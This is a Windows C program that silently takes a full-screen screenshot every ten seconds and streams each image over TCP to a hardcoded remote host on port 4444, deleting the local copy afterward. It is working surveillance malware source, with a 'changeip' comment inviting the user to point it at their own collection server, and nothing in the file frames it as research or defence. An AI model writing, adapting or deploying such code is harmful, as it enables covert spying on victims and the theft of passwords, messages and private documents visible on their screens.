#include <windows.h>
#include <winsock2.h>
#include <wingdi.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "192.168.100.50"  //changeip
#define SERVER_PORT 4444
#define SCREENSHOT_INTERVAL 10000 

int send_screenshot(const char *filename) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    FILE *fp;
    char buffer[1024];
    int bytes_read;

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) return 0;

    fp = fopen(filename, "rb");
    if (!fp) return 0;

    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        send(s, buffer, bytes_read, 0);
    }

    fclose(fp);
    closesocket(s);
    WSACleanup();
    return 1;
}

int capture_screenshot(const char *filename) {
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x, y);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, x, y, hScreen, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hScreen);

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = x;
    bi.biHeight = -y;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((x * bi.biBitCount + 31) / 32) * 4 * y;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char *lpbitmap = (char *)GlobalLock(hDIB);
    GetDIBits(hDC, hBitmap, 0, (UINT)y, lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    FILE *fp = fopen(filename, "wb");
    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, fp);
    fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, fp);
    fwrite(lpbitmap, dwBmpSize, 1, fp);
    fclose(fp);

    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    DeleteDC(hDC);
    DeleteObject(hBitmap);

    return 1;
}

int main() {
    char filename[MAX_PATH];

    while (1) {
        GetTempFileNameA(".", "snap", 0, filename);
        strcat(filename, ".bmp");

        if (capture_screenshot(filename)) {
            send_screenshot(filename);
            DeleteFileA(filename);
        }

        Sleep(SCREENSHOT_INTERVAL);
    }

    return 0;
}
